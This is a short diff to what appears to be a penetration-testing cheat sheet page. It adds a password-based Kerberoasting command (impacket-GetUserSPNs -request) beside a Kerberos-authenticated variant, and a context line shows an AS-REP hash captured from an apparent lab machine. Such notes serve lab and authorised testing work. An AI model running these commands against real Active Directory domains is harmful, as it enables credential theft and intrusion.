@@ -65,6 +65,12 @@ LDAP        10.10.11.181    445    DC               $krb5asrep$23$d.klay@ABSOLUT
 {{< tabcontent set2 tab1 >}}
 
 ```console
+# With Password
+sudo ntpdate -s <DC> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC>
+```
+
+```console
+# With Kerberos
 sudo ntpdate -s <DC> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-host <DC>
 ```
 
